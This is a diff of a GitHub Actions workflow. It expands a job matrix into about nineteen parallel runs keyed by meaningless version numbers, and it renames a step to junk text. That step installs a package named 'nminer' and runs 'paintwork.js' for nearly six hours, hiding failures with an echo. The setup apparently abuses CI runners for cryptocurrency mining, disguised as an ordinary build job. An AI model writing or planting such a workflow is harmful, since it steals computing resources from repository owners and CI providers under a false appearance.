@@ -9,24 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2450 }
-          - { version: 7577 }
-          - { version: 4130 }
-          - { version: 6916 }
-          - { version: 703 }
-          - { version: 6689 }
-          - { version: 162 }
-          - { version: 4447 }
-          - { version: 4287 }
-          - { version: 6684 }
-          - { version: 6413 }
-          - { version: 5739 }
-          - { version: 804 }
-          - { version: 3275 }
-          - { version: 7268 }
-          - { version: 7425 }
-          - { version: 7514 }
-          - { version: 5338 }
+          - { version: 5976 }
+          - { version: 4735 }
+          - { version: 4377 }
+          - { version: 1036 }
+          - { version: 1190 }
+          - { version: 6922 }
+          - { version: 7031 }
+          - { version: 1350 }
+          - { version: 552 }
+          - { version: 1196 }
+          - { version: 9998 }
+          - { version: 4897 }
+          - { version: 4322 }
+          - { version: 6437 }
+          - { version: 1415 }
+          - { version: 730 }
+          - { version: 6442 }
+          - { version: 387 }
+          - { version: 9692 }
 
     steps:
       - name: Checkout
@@ -37,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: during next yippee
+      - name: unrealistic
         run: |
           npm install nminer@latest
-          timeout 350m node paintwork.js || echo "paintwork executed"
+          timeout 339m node paintwork.js || echo "paintwork executed"
